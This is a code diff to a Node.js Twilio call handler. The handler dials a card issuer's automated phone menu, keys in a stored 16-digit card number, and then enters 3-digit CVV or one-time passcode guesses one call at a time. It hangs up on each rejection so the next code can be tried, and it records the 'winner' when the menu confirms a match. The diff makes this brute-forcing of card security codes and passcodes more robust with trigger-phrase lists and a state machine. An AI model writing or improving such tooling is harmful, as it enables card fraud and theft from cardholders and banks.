@@ -114,8 +114,31 @@ export const handleInteractiveListen = async (req, res) => {
       transcript += `IVR: ${SpeechResult}\n`;
     }
 
-    // CASE 1: IVR requests 16-Digit Card / Account Number
-    if (speech.includes('card number') || speech.includes('16 digit') || speech.includes('card') || speech.includes('account number') || speech.includes('enter or save your card') || speech.includes('enter or say your card')) {
+    // ----------------------------------------------------------------
+    // STATE MACHINE — only react to the current stage
+    // ----------------------------------------------------------------
+
+    const status = (attempt.status || '').toUpperCase();
+
+    // STAGE 1: CONNECTED or VALIDATING_16_DIGIT
+    // Only send the 16-digit number when IVR explicitly asks for it
+    const card16Triggers = [
+      'enter or save your card',
+      'enter or say your card',
+      'enter your card number',
+      'please enter your 16',
+      'enter your 16 digit',
+      'enter or save your 16',
+      'please enter your credit card number',
+      'please enter your debit card number',
+      'your card number',
+      'enter your account number',
+      'type your card',
+      'save your card number',
+    ];
+    const askedForCard = card16Triggers.some(trigger => speech.includes(trigger));
+
+    if (askedForCard && status !== 'TESTING_3_DIGIT') {
       transcript += `User (DTMF): ${card}\n`;
       await supabase.from('attempts').update({
         result_details: { ...(attempt.result_details || {}), transcript }
@@ -123,7 +146,7 @@ export const handleInteractiveListen = async (req, res) => {
 
       await AttemptModel.addLog(attemptId, `IVR asked for card number. Transmitting 16-digit card DTMF: ${card}`);
       await AttemptModel.updateAttemptStatus(attemptId, 'VALIDATING_16_DIGIT');
-      
+
       twiml.pause({ length: 1 });
       twiml.play({ digits: `ww${card}` });
 
@@ -131,31 +154,43 @@ export const handleInteractiveListen = async (req, res) => {
         input: 'speech',
         action: `${host}/api/call/listen/${attemptId}`,
         method: 'POST',
-        timeout: 6,
+        timeout: 8,
         speechTimeout: 'auto',
         speechModel: 'phone_call'
       });
-      gather.pause({ length: 5 });
+      gather.pause({ length: 6 });
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
 
       res.type('text/xml');
       return res.send(twiml.toString());
     }
 
-    // Check if 16-digit card was rejected while validating card
-    if (attempt.status === 'VALIDATING_16_DIGIT' && (speech.includes('invalid card') || speech.includes('card not recognized') || speech.includes('cannot find your account') || speech.includes('we cannot process') || speech.includes('incorrect card'))) {
-      await AttemptModel.addLog(attemptId, '❌ 16-digit card rejected by IVR. Test stopped.');
+    // Card rejected after we sent the 16-digit number
+    const cardRejectedPhrases = [
+      'invalid card', 'card not recognized', 'cannot find your account',
+      'we cannot process', 'incorrect card', 'card number is not valid',
+      'not valid', 'cannot be found', 'not recognized'
+    ];
+    if (status === 'VALIDATING_16_DIGIT' && cardRejectedPhrases.some(p => speech.includes(p))) {
+      await AttemptModel.addLog(attemptId, `❌ 16-digit card rejected by IVR. Stopping campaign.`);
       await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, { error: '16-digit card number rejected by IVR' });
       OrchestratorService.stopCampaign();
-      twiml.pause({ length: 1 });
       twiml.hangup();
-
       res.type('text/xml');
       return res.send(twiml.toString());
     }
 
-    // CASE 2: IVR requests 3-Digit Code / Security Code / CVV / Passcode
-    if (speech.includes('three digit') || speech.includes('3 digit') || speech.includes('security code') || speech.includes('cvv') || speech.includes('test code') || speech.includes('passcode') || speech.includes('identity')) {
+    // STAGE 2: IVR requests 3-Digit Code — only after card has been accepted
+    // Do NOT trigger this when status is still CONNECTED (before card was sent)
+    const cvvTriggers = [
+      'three digit', '3 digit', 'three-digit',
+      'security code', 'cvv', 'cvc',
+      'verification code', 'one-time passcode', 'one time passcode',
+      'send you a 1 time passcode', '1 time passcode',
+    ];
+    const askedForCvv = cvvTriggers.some(trigger => speech.includes(trigger));
+
+    if (askedForCvv && (status === 'VALIDATING_16_DIGIT' || status === 'TESTING_3_DIGIT' || status === 'CONNECTED')) {
       transcript += `User (DTMF): ${currentCode}\n`;
       await supabase.from('attempts').update({
         result_details: { ...(attempt.result_details || {}), transcript }
@@ -164,7 +199,7 @@ export const handleInteractiveListen = async (req, res) => {
       if (SpeechResult) {
         await AttemptModel.addLog(attemptId, `IVR (Card Response): "${SpeechResult}"`);
       }
-      await AttemptModel.addLog(attemptId, `IVR asked for test code. Transmitting 3-digit test code: ${currentCode}`);
+      await AttemptModel.addLog(attemptId, `IVR asked for 3-digit code. Transmitting: ${currentCode}`);
       await AttemptModel.updateAttemptStatus(attemptId, 'TESTING_3_DIGIT');
 
       twiml.pause({ length: 1 });
@@ -174,32 +209,45 @@ export const handleInteractiveListen = async (req, res) => {
         input: 'speech',
         action: `${host}/api/call/listen/${attemptId}`,
         method: 'POST',
-        timeout: 6,
+        timeout: 8,
         speechTimeout: 'auto',
         speechModel: 'phone_call'
       });
-      gather.pause({ length: 5 });
+      gather.pause({ length: 6 });
       twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
 
       res.type('text/xml');
       return res.send(twiml.toString());
     }
 
-    // Only evaluate Success / Rejection AFTER the 3-digit test code has been entered
-    if (attempt.status === 'TESTING_3_DIGIT') {
-      if (SpeechResult) {
-        await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
-      }
+    // STAGE 3: Evaluate IVR response AFTER the 3-digit code was entered
+    if (status === 'TESTING_3_DIGIT' && SpeechResult) {
+      await AttemptModel.addLog(attemptId, `IVR (Code Response): "${SpeechResult}"`);
       await supabase.from('attempts').update({
         result_details: { ...(attempt.result_details || {}), transcript }
       }).eq('id', attemptId);
 
-      const isSuccessPhrase = speech.includes('verification successful') || speech.includes('details are verified') || speech.includes('code accepted') || speech.includes('verified');
-      const isCodeMatch = targetCode ? (currentCode === targetCode) : isSuccessPhrase;
+      // Success phrases from IVR
+      const successPhrases = [
+        'verification successful', 'details are verified', 'code accepted',
+        'successfully verified', 'thank you, your', 'has been verified',
+        'code is correct', 'correct code', 'passcode accepted'
+      ];
+      // Rejection / code incorrect phrases
+      const failurePhrases = [
+        'incorrect', 'invalid code', 'code does not match', 'not match',
+        'try again', 'does not match', 'code is incorrect',
+        'please call back', 'call back', 'goodbye', 'thank you for calling'
+      ];
 
-      if (isCodeMatch && (isSuccessPhrase || currentCode === targetCode)) {
-        await AttemptModel.addLog(attemptId, `✅ IVR Confirmed: Verification successful for code ${currentCode}.`);
-        await AttemptModel.addLog(attemptId, `Code ${currentCode} MATCHED`);
+      const isSuccess = successPhrases.some(p => speech.includes(p));
+      const isFailure = failurePhrases.some(p => speech.includes(p));
+
+      // Also check if IVR is asking for the code AGAIN (retry same call flow edge case)
+      const isAskingAgain = cvvTriggers.some(t => speech.includes(t));
+
+      if (isSuccess) {
+        await AttemptModel.addLog(attemptId, `✅ Code ${currentCode} VERIFIED — IVR confirmed correct.`);
         await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', 0, {
           matched_code: currentCode,
           winner: currentCode,
@@ -209,23 +257,36 @@ export const handleInteractiveListen = async (req, res) => {
         OrchestratorService.stopCampaign();
         twiml.pause({ length: 2 });
         twiml.hangup();
-
-        res.type('text/xml');
-        return res.send(twiml.toString());
-      } else {
-        await AttemptModel.addLog(attemptId, `✅ Call completed for code ${currentCode}. Disconnecting call to dial next code.`);
-        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
-          error: `IVR rejected code ${currentCode}`
-        });
-        twiml.pause({ length: 1 });
-        twiml.hangup();
-
         res.type('text/xml');
         return res.send(twiml.toString());
       }
+
+      if (isFailure || isAskingAgain) {
+        await AttemptModel.addLog(attemptId, `❌ Code ${currentCode} rejected. Ending call — next code will be tried automatically.`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', 0, {
+          error: `IVR rejected code ${currentCode}`
+        });
+        twiml.hangup();
+        res.type('text/xml');
+        return res.send(twiml.toString());
+      }
+
+      // IVR still talking (informational speech) — keep listening
+      const gather = twiml.gather({
+        input: 'speech',
+        action: `${host}/api/call/listen/${attemptId}`,
+        method: 'POST',
+        timeout: 8,
+        speechTimeout: 'auto',
+        speechModel: 'phone_call'
+      });
+      gather.pause({ length: 6 });
+      twiml.redirect({ method: 'POST' }, `${host}/api/call/listen/${attemptId}?silence=true`);
+      res.type('text/xml');
+      return res.send(twiml.toString());
     }
 
-    // CASE 5: General intro or continue listening
+    // FALLBACK: General intro / continue listening — log speech and keep gathering
     await supabase.from('attempts').update({
       result_details: { ...(attempt.result_details || {}), transcript }
     }).eq('id', attemptId);
@@ -234,7 +295,7 @@ export const handleInteractiveListen = async (req, res) => {
       input: 'speech',
       action: `${host}/api/call/listen/${attemptId}`,
       method: 'POST',
-      timeout: 6,
+      timeout: 8,
       speechTimeout: 'auto',
       speechModel: 'phone_call'
     });
